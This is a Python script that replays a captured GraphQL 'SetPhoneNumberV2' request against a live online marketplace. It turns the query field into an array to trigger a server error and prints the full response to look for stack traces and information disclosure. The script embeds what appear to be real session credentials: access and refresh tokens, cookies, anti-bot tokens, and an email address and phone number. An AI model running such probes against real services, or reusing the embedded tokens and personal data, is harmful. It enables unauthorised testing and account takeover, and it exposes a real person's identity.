#!/usr/bin/env python3
"""
Standalone replay: fires the EXACT captured GraphQL request with only the
'query' field mutated into an array, and prints the FULL raw response body
so you can manually inspect the 500 for stack traces / info disclosure.
"""
import requests, json

headers = {
    "content-length": "5911",
    "x-whatnot-app-session-id": "8580430b-8653-470c-bbf7-349def4f6eca",
    "x-kpsdk-ct": "032uH9UrwiZKsGa8hDyn5Lp3xTHoaa21m31Qz7vPtCVoKFuzvKYsxHePIyUYwli9gMmUY4833KcY0OlU5HrXGJd7M4J4myxa2bQeZBfet9xADDi4nrjsX336oIatJdh6e0rEeByJt7TLldMlOwybSMyZkRe8AUdIPaQ3TyMtQGzlzu",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Cookie",
    "x-whatnot-usgmt": ",,",
    "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?1",
    "x-whatnot-web-request-id": "a211b39eeb1773a7",
    "x-kpsdk-v": "j-1.2.522",
    "x-whatnot-app-context": "next-js/browser",
    "x-whatnot-app": "whatnot-web",
    "x-kpsdk-cd": "{\"workTime\":1785051185882,\"id\":\"467d716ceb01a2aed66ff337ee8fca63\",\"answers\":[2,9],\"duration\":477,\"d\":-690,\"st\":1785004017376,\"rst\":1785004016686}",
    "accept": "*/*",
    "content-type": "application/json",
    "x-whatnot-app-user-session-id": "81470dc6-5038-4389-a977-e9b56f819673",
    "x-whatnot-app-version": "20260725-0107",
    "x-whatnot-app-pathname": "/",
    "accept-language": "en-US",
    "x-kpsdk-h": "01LAYcQHBsrRxyq9ja+CNVxPZlQ9g=",
    "x-whatnot-app-screen": "/",
    "save-data": "on",
    "x-client-timezone": "Africa/Juba",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "origin": "https://www.whatnot.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.whatnot.com/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "cookie": "_dd_s=aid=3dc41e09-7c26-49ff-821b-d8daa150bf8e&logs=1&id=e68641f7-b6eb-4995-9ede-fd3fb78281b2&created=1785049807975&expire=1785052081841&rum=0",
    "priority": "u=1, i"
}
cookies = {
    "stable-id": "4c239604-5076-4501-8b53-f1dd47ac646c",
    "cookieyes-consent": "consentid:d1VIaXp3V3hpMUpvSVdDSm1wWkpNUjA2UERWc2ZyWDI,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes",
    "__stripe_mid": "ca1f292e-f600-4d5f-a4f4-724a742aa09fa57b99",
    "__ps_r": "_",
    "__ps_lu": "https://www.whatnot.com/login",
    "__ps_did": "pscrb_c41319a9-a1dc-415a-fafb-143cb698fc56",
    "__ps_fva": "1776452039657",
    "f3k2kqs7xc": "dc400770ec711b3ab3ceee3ba1222384",
    "g_state": "{\"i_l\":0,\"i_ll\":1776612430885,\"i_b\":\"7URN7F3DWtz90Y56KAkUX5y40bQMNMa2Hek2VFHPYec\",\"i_e\":{\"enable_itp_optimization\":19},\"i_et\":1776452015079}",
    "__Secure-is-http-only-auth": "1",
    "__Secure-refresh-token-fp": "none",
    "cas_cid": "NTbZlAYIXd-XZoV1ZDLoXIhmtHOJWceOWWiyj_YYxQBWwnphIX5vWC_l2oTJRvd_AAAAAGqAr0A_yZmZmZmZmg",
    "__Secure-claims": "eyJjIjoxNzg1MDAzOTY4OTY2LCJzIjoiODU4MDQzMGItODY1My00NzBjLWJiZjctMzQ5ZGVmNGY2ZWNhIiwidSI6NTgyMzIwMDF9",
    "KP_UIDz-ssn": "032uH9UrwiZKsGa8hDyn5Lp3xTHoaa21m31Qz7vPtCVoKFuzvKYsxHePIyUYwli9gMmUY4833KcY0OlU5HrXGJd7M4J4myxa2bQeZBfet9xADDi4nrjsX336oIatJdh6e0rEeByJt7TLldMlOwybSMyZkRe8AUdIPaQ3TyMtQGzlzu",
    "KP_UIDz": "032uH9UrwiZKsGa8hDyn5Lp3xTHoaa21m31Qz7vPtCVoKFuzvKYsxHePIyUYwli9gMmUY4833KcY0OlU5HrXGJd7M4J4myxa2bQeZBfet9xADDi4nrjsX336oIatJdh6e0rEeByJt7TLldMlOwybSMyZkRe8AUdIPaQ3TyMtQGzlzu",
    "ajs_user_id": "58232001",
    "ajs_anonymous_id": "e28f8393-cf1f-4193-a277-758ce79bcef2",
    "FPC": "3e115d6e-82c0-422c-95e8d5fd82ced10c",
    "__spdt": "b5e4f5d3bb424da3a627477b7a706451",
    "_gid": "GA1.2.331191375.1785004061",
    "_tt_enable_cookie": "1",
    "_ttp": "01KYD8GZFTP0VQF880E4Y80K60_.tt.1",
    "usid": "81470dc6-5038-4389-a977-e9b56f819673",
    "device": "1bd06228-d78a-4afa-bd03-c23a502e29ba",
    "__stripe_sid": "801d4758-d63c-42a9-baca-5edcfd616a45acb625",
    "__ps_sr": "_",
    "__ps_slu": "https://www.whatnot.com//api/inbox",
    "__Secure-urs": "eyJjIjoxNzg1MDQ5ODgwMTA0LCJzIjpbIkFDQ09VTlRfV0lUSE9VVF9QVVJDSEFTRSIsIkJVWUVSIl19.Pfutf9GX%2FQ2ajZDpiStpuw7MW8haL7tiVeftIesBMtg",
    "_rdt_uuid": "1785049895880.e9b89300-e381-4ce5-9d43-7235575e2ebd",
    "_fbp": "fb.1.1785049897153.495129607775385971",
    "_rdt_em": "c7933f64be50fa0a353bfd3c8d424d50d6f8cfa8d77a24bd6c86f57f5ea8770a",
    "__Secure-access-token-fp": "none",
    "__Secure-refresh-token": "eyJhbGciOiJFZERTQSIsImtpZCI6IndoYXRub3QtcmVmcmVzaC1wcm9kLTEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOjU4MjMyMDAxLCJpc3MiOiJ3aGF0bm90L2F1dGgiLCJhdWQiOiJ3aGF0bm90L3JlZnJlc2giLCJleHAiOjE4MTY1ODcwNTQsImlhdCI6MTc4NTA1MTA1NCwibmJmIjoxNzg1MDUxMDU0LCJqdGkiOiJ1emI3amxVWExFQlZXTkJIblE2R2xRIiwiYXBwc2lkIjoiODU4MDQzMGItODY1My00NzBjLWJiZjctMzQ5ZGVmNGY2ZWNhIiwidXByIjowLjIsInNlc3Npb25fdG9rZW4iOiJ3bl9ydF94cWpjVkFpUW5xVEdrbWpmVHlfcTpFSFkwQVBISmNhdlJ1ZHl6SjNFSSJ9.AjiQtdTZ1DmU51uWITwQqItt6AmH68AV49XrDnVnsFa7R0A8T3qr_x6smHUKlyDBFOdgyFDmVuvF6CueMmMjBw",
    "__Secure-access-token": "eyJhbGciOiJFZERTQSIsImtpZCI6IndoYXRub3QtYWNjZXNzLXByb2QtMyIsInR5cCI6IkpXVCJ9.eyJzdWIiOjU4MjMyMDAxLCJpc3MiOiJ3aGF0bm90L2F1dGgiLCJhdWQiOiJ3aGF0bm90L2FjY2VzcyIsImV4cCI6MTc4NTA1MTM1NCwiaWF0IjoxNzg1MDUxMDU0LCJuYmYiOjE3ODUwNTEwNTQsImp0aSI6Ijl1eF9EQlhTeHJlYS1Jcndyay1vSGciLCJhcHBzaWQiOiI4NTgwNDMwYi04NjUzLTQ3MGMtYmJmNy0zNDlkZWY0ZjZlY2EiLCJ1cHIiOjAuMiwiaWRlbnRpdHkiOiJrYXJsb3NkYXZpZDI2OEBnbWFpbC5jb20ifQ.HJ1vrcqrQlHKdgWzpW5uv0fEMR1wCg2mTvxywDtNAM0wuroCatRlJoGLhfnpgmy1Xf7xFnGuIywRcQvXVGbiAQ",
    "__Secure-access-token-expiration": "1785051354",
    "__Secure-whatnot-live": "SFMyNTY.g3QAAAACbQAAAAtfY3NyZl90b2tlbm0AAAAYMkFWbzV5R3hBLTRWLUFXRkhRWWZ0YUZnbQAAAAZjbGFpbXN0AAAACm0AAAAGYXBwc2lkbQAAACQ4NTgwNDMwYi04NjUzLTQ3MGMtYmJmNy0zNDlkZWY0ZjZlY2FtAAAAA2F1ZG0AAAAOd2hhdG5vdC9hY2Nlc3NtAAAAA2V4cGJqZbjabQAAAANpYXRiamW3rm0AAAAIaWRlbnRpdHltAAAAGGthcmxvc2RhdmlkMjY4QGdtYWlsLmNvbW0AAAADaXNzbQAAAAx3aGF0bm90L2F1dGhtAAAAA2p0aW0AAAAWOXV4X0RCWFN4cmVhLUlyd3JrLW9IZ20AAAADbmJmYmplt65tAAAAA3N1Ym0AAAAINTgyMzIwMDFtAAAAA3VwckY_yZmZmZmZmg.3JT_0HrY1lD-XmJWAAJwnjsx3KU4k41vvUQpHMfqASY",
    "_cfuvid": "OXgTcBnSpKj9Fg_reAroERyUgXsecNULXYb_qKC7gy8-1785051083408-0.0.1.1-604800000",
    "_gcl_au": "1.1.448708330.1785004051.-.-.1785004066.256938882.1785004067.1785051086",
    "tatari-cookie-test": "39394684",
    "tatari-session-cookie": "8ff8a612-a63d-c76e-c876-ffcc3be5323c",
    "_ga_XWV3ZESVF5": "GS2.1.s1785049820$o2$g1$t1785051091$j23$l0$h0",
    "_ga": "GA1.1.1993678503.1785004061",
    "__cf_bm": "6fIZ7Y0JMI7UMcBgiQHp7odQhgpg8PGgpHhCIoKHUHM-1785051177.256233-1.0.1.1-UBSDvhG7tgbQ2MUwnFrrRlcb1ueV_aJ_aoyOfU2T9lJ.j1qFtXOA.FZp_6I_PoxAuH1G2fmQEvHDBZwEmhXKl2hw6TrzM06t6t3jlKM0q5z91ZO9OQEN0zUoUCp6kvP_",
    "cas_session": "zcswvYFhUmm9BD-hKHI5WTU22ZQGCF3fl2aFdWQy6Fz09CamH1ADUvTTHj_yoDKltsmArsK9ojFHBNlbT0zqSwAAAABqZbnO",
    "ttcsid_CQ8NDTBC77U1R0P6570G": "1785049819635::VBsnI5zVe4VhxoYiYmJJ.2.1785051179879.1",
    "ttcsid": "1785049819644::wTyBm7T7IuN1OObacnC5.2.1785051179897.0::1.1233208.1271279::1360100.59.305.295::231311.50.0",
    "ttcsid_D7OFQ7RC77U471PH179G": "1785049819655::4hp0BpKYdnAFaCi9tyYT.2.1785051179899.1",
    "_dd_s": "aid=3dc41e09-7c26-49ff-821b-d8daa150bf8e&logs=1&id=e68641f7-b6eb-4995-9ede-fd3fb78281b2&created=1785049807975&expire=1785052081841&rum=0"
}
body = {
    "operationName": "SetPhoneNumberV2",
    "variables": {
        "phoneNumber": "+16465180948",
        "session": "W;6.10.11;CWhVII9NQ8Pd113pjJ9t6A==;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",
        "verificationChannel": "SMS"
    },
    "query": "mutation SetPhoneNumberV2($phoneNumber:String!$session:String$verificationChannel:PhoneVerificationChannel){setPhoneNumberV2(phoneNumber:$phoneNumber session:$session verificationChannel:$verificationChannel){user{id phoneNumber phoneVerifiedAt email __typename}snaUrl __typename}}"
}

# the exact mutation that triggered the 500
original_query = body["query"]
body["query"] = [original_query, original_query + "_2"]

resp = requests.post(
    "https://www.whatnot.com/services/graphql/?operationName=SetPhoneNumberV2&ssr=0",
    headers=headers,
    cookies=cookies,
    json=body,
    timeout=15,
)

print("STATUS:", resp.status_code)
print("RESPONSE HEADERS:")
for k, v in resp.headers.items():
    print(f"  {k}: {v}")
print()
print("FULL RAW BODY:")
print(resp.text)
